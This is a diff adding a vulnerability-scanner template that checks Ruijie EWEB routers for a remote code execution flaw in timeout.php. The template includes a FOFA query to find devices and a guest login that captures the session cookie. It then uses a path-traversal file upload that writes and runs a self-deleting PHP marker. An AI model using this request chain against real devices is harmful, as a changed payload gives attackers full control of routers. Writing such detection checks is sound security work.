@@ -1,0 +1,59 @@
+id: ruijieEWEB-timeout_php-File-upload
+
+info:
+  name: "锐捷EWEB路由器 timeout.php 文件上传导致远程代码执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="锐捷网络-EWEB网管系统"
+    该设备管理系统 timeout.php 脚本存在远程代码执行缺陷，攻击者可利用此漏洞在目标服务器上执行任意代码，部署恶意负载，从而实现对Web服务器的完全控制。此漏洞源于文件上传验证机制缺失，允许未经授权的请求者上传可执行文件，最终导致系统权限被非法获取。
+  reference:
+  - https://mp.weixin.qq.com/s/uvgXkz89Dhp4xbsPowlyLA
+  tags: 锐捷
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /ddi/server/login.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    Content-Type: application/x-www-form-urlencoded
+
+    username=guest&password=guest?
+  extractors:
+  - type: regex
+    part: header
+    name: RUIJIEID
+    group: 1
+    regex:
+    - 'RUIJIEID=(.*?);'
+    internal: true
+- raw:
+  - |
+    POST /system_pi/timeout.php?a=upload HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    Cookie: {{RUIJIEID}}
+    Content-Type: application/x-www-form-urlencoded
+
+    fileName=../tmp/html/{{username}}.php&mes=<?php print(111*222);unlink(__FILE__);?>
+  - |
+    GET /{{username}}.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    Cookie: {{RUIJIEID}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '24642'
+  - type: status
+    status:
+    - 200
